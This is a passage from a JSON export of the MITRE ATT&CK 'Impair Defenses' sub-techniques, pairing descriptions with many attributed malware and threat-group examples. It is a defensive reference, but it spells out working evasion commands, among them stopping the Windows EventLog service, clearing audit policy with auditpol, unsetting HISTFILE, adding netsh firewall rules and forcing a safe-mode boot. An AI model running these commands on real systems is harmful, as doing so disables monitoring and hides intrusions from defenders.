boot.\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.", "id": "T1562.001", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry internet settings to lower internet security. "}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has the capability to kill any running analysis processes and AV software."}, {"id": "G1030", "name": "Agrius", "description": "Agrius used several mechanisms to try to disable security tools. Agrius attempted to modify EDR-related services to disable auto-start on system reboot. Agrius used a publicly available driver, GMER64.sys typically used for anti-rootkit functionality, to selectively stop and remove security software processes."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has attempted to stop endpoint detection and response (EDR) tools on compromised systems."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon looks for and attempts to stop anti-malware solutions."}, {"id": "S0638", "name": "Babuk", "description": "Babuk can stop anti-virus services on a compromised host."}, {"id": "S0534", "name": "Bazar", "description": "Bazar has manually loaded ntdll from disk in order to identity and remove API hooks set by security products."}, {"id": "S0252", "name": "Brave Prince", "description": "Brave Prince terminates antimalware processes."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has incorporated code into several tools that attempts to terminate anti-virus processes."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore can change browser security settings to enable extensions to be installed. Bundlore uses the pkill cfprefsd command to prevent users from inspecting processes."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed."}, {"id": "S0144", "name": "ChChes", "description": "ChChes can alter the victim's proxy configuration."}, {"id": "S0611", "name": "Clop", "description": "Clop can uninstall or disable security products."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike has the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox."}, {"id": "S0608", "name": "Conficker", "description": "Conficker terminates various services related to system security and Windows."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors disabled logging and modified the compcheckresult.cgi component to edit the Ivanti Connect Secure built-in Integrity Checker exclusion list to evade detection."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can disable Security Center functions like anti-virus."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate will terminate processes associated with several security software products if identified during execution."}, {"id": "S0659", "name": "Diavol", "description": "Diavol can attempt to stop security software."}, {"id": "S0695", "name": "Donut", "description": "Donut can patch Antimalware Scan Interface (AMSI), Windows Lockdown Policy (WLDP), as well as exit-related Native API functions to avoid process termination."}, {"id": "S0377", "name": "Ebury", "description": "Ebury can disable SELinux Role-Based Access Control and deactivate PAM modules."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has disabled Windows Defender to evade protections."}, {"id": "S0605", "name": "EKANS", "description": "EKANS stops processes related to security and management software."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear uses the NirSoft AdvancedRun utility to disable Microsoft Defender Antivirus through stopping the WinDefend service on victim machines. Ember Bear disables Windows Defender via registry key changes."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has deployed a utility script named kill.bat to disable anti-virus."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has delivered macros which can tamper with Microsoft Office security settings."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon terminates anti-malware processes if they\u2019re found running on the system."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to disable Microsoft Outlook's security policies to disable macro warnings."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can hook APIs, kill processes, break file system paths, and change ACLs to prevent security tools from running."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 kills and disables services for Windows Security Center, and Windows Defender."}, {"id": "S0061", "name": "HDoor", "description": "HDoor kills anti-virus found on the victim."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has modified DNS resolvers to evade DNS monitoring tools."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors modified and disabled components of endpoint detection and response (EDR) solutions including Microsoft Defender Antivirus."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a feature to disable Windows Task Manager."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom can use SystemSettingsAdminFlows.exe, a native Windows utility, to disable Windows Defender."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider used PsExec to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring. Indrik Spider has used MpCmdRun to revert the definitions in Microsoft Defender. Additionally, Indrik Spider has used WMI to stop or uninstall and reset anti-virus products and other defensive services."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can lower security settings by changing Registry keys."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS will attempt to delete or disable all Registry keys and scheduled tasks related to Microsoft Security Defender and Security Essentials."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity used various scripts to remove or disable security tools, such as http_watchdog and firewallsd, as well as tools related to other botnet infections, such as mips_ff, on victim devices."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, Lazarus Group malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.."}, {"id": "S0372", "name": "LockerGoga", "description": "LockerGoga installation has been immediately preceded by a \"task kill\" command in order to disable anti-virus."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner has searched for the Activity Monitor process in the System Events process list and kills the process if running. macOS.OSAMiner also searches the operating system's install.log for apps matching its hardcoded list, killing all matching process names."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has disabled antivirus services on targeted systems in order to upload malicious payloads."}, {"id": "S0449", "name": "Maze", "description": "Maze has disabled dynamic analysis and other security tools including IDA debugger, x32dbg, and OllyDbg. It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex was used to kill endpoint security processes."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has a function to kill processes associated with defenses and can prevent certain processes from launching."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can attempt to uninstall Kaspersky Antivirus or remove the Kaspersky license; it can also add all files and folders related to the attack to the Windows Defender exclusion list."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater can disable the system's local proxy settings."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper removes the Volume Shadow Copy (VSS) service from infected devices along with all present shadow copies."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu can change Internet Explorer settings to reduce warnings about malware activity."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore can modify the victim's anti-virus."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker can detect and terminate active security software-related processes on infected systems."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors disabled anti-virus and anti-spyware tools in some instances on the victim\u2019s machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet."}, {"id": "G1040", "name": "Play", "description": "Play has used tools including GMER, IOBit, and PowerTool to disable antivirus software."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can disable Microsoft Office Protected View by changing Registry keys."}, {"id": "S0279", "name": "Proton", "description": "Proton kills security tools like Wireshark that are running."}, {"id": "G0024", "name": "Putter Panda", "description": "Malware used by Putter Panda attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe)."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has the capability to stop antivirus services and disable Windows Defender."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to modify the Registry to add its binaries to the Windows Defender exclusion list."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker has attempted to terminate/stop processes and services associated with endpoint security products."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin can add an exception to Microsoft Defender that excludes the entire main drive from anti-malware scanning to evade detection."}, {"id": "S0496", "name": "REvil", "description": "REvil can connect to and disable the Symantec server on the victim's network."}, {"id": "S0400", "name": "RobbinHood", "description": "RobbinHood will search for Windows services that are associated with antivirus software on the system and kill the process."}, {"id": "G0106", "name": "Rocke", "description": "Rocke used scripts which detected and uninstalled antivirus software."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT kills antimalware running process."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has stopped services related to anti-virus."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear will modify registry entries and scheduled task objects associated with Windows Defender to disable its functionality."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY's amsiPatch.py module can disable Antimalware Scan Interface (AMSI) functions."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to set SELinux to permissive mode."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used the service control manager on a remote system to disable services associated with security monitoring products."}, {"id": "S0058", "name": "SslMM", "description": "SslMM identifies and kills anti-malware processes."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can add directories used by the malware to the Windows Defender exclusions list to prevent detection."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist."}, {"id": "G1018", "name": "TA2541", "description": "TA2541  has attempted to disable built-in security protections such as Windows AMSI. "}, {"id": "G0092", "name": "TA505", "description": "TA505 has used malware to disable Windows Defender."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has disabled and uninstalled security tools such as Alibaba, Tencent, and BMC cloud monitoring agents on cloud-based infrastructure."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest uses the function kill_unwanted to obtain a list of running processes and kills each process matching a list of security related processes."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot can disable Avira anti-virus."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can disable Windows Defender."}, {"id": "G0010", "name": "Turla", "description": "Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products."}, {"id": "S0130", "name": "Unknown Logger", "description": "Unknown Logger has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can disarm Windows Defender during the UAC process to evade detection."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can download and execute AdvancedRun.exe to disable the Windows Defender Theat Protection service and set an exclusion path for the C:\\ drive."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can add itself to the exclusion list for the Ivanti Connect Secure Integrity Checker Tool if the --exclude parameter is passed by the tar process."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can kill AV products' processes."}]}, {"name": "Disable Windows Event Logging", "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.", "detailed_description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.\nThe EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to Security Settings\\Local Policies\\Audit Policy for basic audit policy settings or Security Settings\\Advanced Audit Policy Configuration for advanced audit policy settings. auditpol.exe may also be used to set audit policies.\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the Set-Service -Name EventLog -Status Stopped or sc config eventlog start=disabled commands (followed by manually stopping the service using Stop-Service  -Name EventLog). Additionally, the service may be disabled by modifying the \"Start\" value in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog then restarting the system for the change to take effect.\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security, then reboot the system to disable the Security EventLog. Second, with Administrator privilege, adversaries may modify the same values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System and HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application to disable the entire EventLog.\nAdditionally, adversaries may use auditpol and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the /success or /failure parameters. For example, auditpol /set /category:\"Account Logon\" /success:disable /failure:disable turns off auditing for the Account Logon category. To clear the audit policy, adversaries may run the following lines: auditpol /clear /y or auditpol /remove /allusers.\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.", "id": "T1562.002", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team disabled event logging on compromised systems."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors deleted Windows events and application logs."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has executed scripts to disable the event log service."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29, used AUDITPOL to prevent the collection of audit logs."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used appcmd.exe to disable logging on a victim server."}, {"id": "S0645", "name": "Wevtutil", "description": "Wevtutil can be used to disable specific event logs on the system."}]}, {"name": "Impair Command History Logging", "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.", "detailed_description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected.\nAdversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands. Additionally, HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". HISTCONTROL can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \" ls\" will not be saved, but \"ls\" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.\nOn Windows systems, the PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt by default). Adversaries may change where these logs are saved using Set-PSReadLineOption -HistorySavePath {File Path}. This will cause ConsoleHost_history.txt to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command Set-PSReadlineOption -HistorySaveStyle SaveNothing.\nAdversaries may also leverage a Network Device CLI on network devices to disable historical command logging (e.g. no logging).", "id": "T1562.003", "examples": [{"id": "G0082", "name": "APT38", "description": "APT38 has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment."}, {"id": "S1161", "name": "BPFDoor", "description": "BPFDoor sets the MYSQL_HISTFILE and HISTFILE to /dev/null preventing the shell and MySQL from logging history in /proc/<PID>/environ."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can bypass ScriptBlock logging to execute unmanaged PowerShell code from memory."}]}, {"name": "Disable or Modify System Firewall", "description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.", "detailed_description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various Remote Services may also indirectly modify firewall rules.", "id": "T1562.004", "examples": [{"id": "G0082", "name": "APT38", "description": "APT38 have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443."}, {"id": "S0031", "name": "BACKSPACE", "description": "The \"ZR\" variant of BACKSPACE will check to see if known host-based firewalls are installed on the infected systems. BACKSPACE will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed."}, {"id": "S0245", "name": "BADCALL", "description": "BADCALL disables the Windows firewall before binding to a port."}, {"id": "S1161", "name": "BPFDoor", "description": "BPFDoor starts a shell on a high TCP port starting at 42391 up to 43391, then changes the local iptables rules to redirect all packets from the attacker to the shell port."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak may use netsh to add local firewall rule exceptions."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has checked for the presence of \"Little Snitch\", macOS network monitoring and application firewall software, stopping and exiting if it is found."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can modify the Linux iptables firewall to enable C2 communication on network devices via a stored list of port numbers."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can disable Security Center functions like the Windows Firewall."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has disabled host-based firewalls. The group has also globally opened port 3389."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can block the Deibold Warsaw GAS Tecnologia security tool at the firewall level."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 kills and disables services for Windows Firewall."}, {"id": "S0246", "name": "HARDRAIN", "description": "HARDRAIN opens the Windows Firewall to modify incoming connections."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has modified the firewall using netsh."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has a command to disable routing and the Firewall on the victim\u2019s machine."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet has the ability to change firewall settings to allow a plug-in to be downloaded."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has been observed disabling the system firewall."}, {"id": "G0032", "name": "Lazarus Group", "description": "Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh. "}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has added the following rule to a victim's Windows firewall to allow RDP traffic - \"netsh\" advfirewall firewall add rule name=\"Terminal Server\" dir=in action=allow protocol=TCP localport=3389."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has used batch scripts that can disable the Windows firewall on specific remote machines."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore can modify the victim's firewall."}, {"id": "S0108", "name": "netsh", "description": "netsh can be used to disable local firewall settings."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has modified the Windows firewall to allow itself to communicate through the firewall."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used PowerShell to add and delete rules in the Windows firewall."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt has modified firewall rules to allow incoming SMB, NetBIOS, and RPC connections using netsh.exe on remote machines."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can add or remove applications or ports on the Windows firewall or disable it entirely."}, {"id": "G0106", "name": "Rocke", "description": "Rocke used scripts which killed processes and added firewall rules to block traffic related to other cryptominers."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used netsh to configure firewall rules that limited certain UDP outbound packets."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has disabled iptables."}, {"id": "G1022", "name": "ToddyCat", "description": "Prior to executing a backdoor ToddyCat  has run cmd /c start /b netsh advfirewall firewall add rule name=\"SGAccessInboundRule\" dir=in protocol=udp action=allow localport=49683 to allow the targeted system to receive UDP packets on port 49683."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME can open the Windows Firewall on the victim\u2019s machine to allow incoming connections."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can disable the firewall by modifying the registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile."}]}, {"name": "Indicator Blocking", "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.", "detailed_description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.\nFor example, adversaries may modify the File value in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations.\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors .", "id": "T1562.006", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used the CLEANPULSE utility to insert command line strings into a targeted process to prevent certain log events from occurring."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has the ability to hide memory artifacts and to patch Event Tracing for Windows (ETW) and the Anti Malware Scan Interface (AMSI)."}, {"id": "S0377", "name": "Ebury", "description": "Ebury hooks system functions to prevent the user from seeing malicious files (readdir, realpath, readlink, stat, open, and variants), hide process activity (ps and readdir64), and socket activity (open and fopen)."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to set the HKLM:\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\CrashControl\\CrashDumpEnabled Registry key to 0 in order to disable crash dumps."}, {"id": "S1097", "name": "HUI Loader", "description": "HUI Loader has the ability to disable Windows Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI) functions."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can hook the ZwOpenProcess and GetExtendedTcpTable APIs called by the process of a security product to hide PIDs and TCP records from detection."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT has suppressed all error reporting by calling SetErrorMode with 0x8007 as a parameter."}]}, {"name": "Disable or Modify Cloud Firewall", "description": "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall.", "detailed_description": "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall.\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance. They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for Brute Force or Endpoint Denial of Service.", "id": "T1562.007", "examples": [{"id": "S1091", "name": "Pacu", "description": "Pacu can allowlist IP addresses in AWS GuardDuty."}]}, {"name": "Disable or Modify Cloud Logs", "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.", "detailed_description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. In Office 365, an adversary may disable logging on mail collection activities for specific users by using the Set-MailboxAuditBypassAssociation cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.", "id": "T1562.008", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has disabled Purview Audit on targeted accounts prior to stealing emails from  Microsoft 365 tenants."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can disable or otherwise restrict various AWS logging services, such as AWS CloudTrail and VPC flow logs."}]}, {"name": "Safe Mode Boot", "description": "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.", "detailed_description": "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. Modify Registry). Malicious Component Object Model (COM) objects may also be registered and loaded in safe mode.", "id": "T1562.009", "examples": [{"id": "S1053", "name": "AvosLocker", "description": "AvosLocker can restart a compromised machine in safe mode."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can reboot victim machines in safe mode with networking via bcdedit /set safeboot network."}, {"id": "S0496", "name": "REvil", "description": "REvil can force a reboot in safe mode with networking."}]}, {"name": "Downgrade Attack", "description": "Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system\u2019s backward compatibility to force it into less secure modes of operation.", "detailed_description": "Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system\u2019s backward compatibility to force it into less secure modes of operation.\nAdversaries may downgrade and use various less-secure versions of features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle or Network Sniffing. For example, PowerShell versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to Impair Defenses while running malicious scripts that may have otherwise been detected.\nAdversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.", "id": "T1562.010", "examples": [{"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can downgrade NTLM to capture NTLM hashes."}]}, {"name": "Spoof Security Alerting", "description": "Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders\u2019 awareness of malicious activity. Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.", "detailed_description": "Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders\u2019 awareness of malicious activity. Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.\nRather than or in addition to Indicator Blocking, an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., Disable or Modify Tools). An adversary can also present a \"healthy\" system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.\nFor example, adversaries may show a fake Windows Security GUI and tray icon with a \"healthy\" system status after Windows Defender and other system tools have been disabled.", "id": "T1562.011", "examples": []}, {"name": "Disable or Modify Linux Audit System", "description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the 